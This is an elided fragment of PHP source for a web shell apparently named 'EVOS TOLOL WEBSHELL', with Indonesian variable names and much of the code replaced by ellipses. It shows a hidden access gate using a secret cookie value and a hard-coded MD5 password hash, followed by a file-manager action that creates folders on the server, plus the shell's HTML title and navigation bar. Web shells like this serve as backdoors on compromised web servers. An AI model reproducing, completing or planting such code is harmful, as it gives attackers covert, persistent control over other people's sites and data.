...
if (isset($_COOKIE['cus']) && $_COOKIE['cus'] === 'capcus7') {
    ...
    if (isset($_POST['login']) && md5($_POST['password']) === '8f5fe0cf1b797c9cf490b24c7f80a794') {
		...
		case $_POST['pilihan'] == 'createFolder':
			...
			if(isset($_POST['createFolder'])) {
				...
				if(mkdir($dirPath . $namaFolder)) {
					...
					}elseif(!is_writable($dirPath)){$pesanCreate = 'Directory not writable';
					}
				}
			}
			break;
...
<html>
<head>
	<title>EVOS TOLOL WEBSHELL</title>
</head>
	...
	<nav>
       <div class="container">
	    <div class="nav-wrapper">
	      <a href="#" class="brand-logo center navbar-text">EVOS TOLOL WEBSHELL</a>
	    </div>
	   </div>
  	</nav>
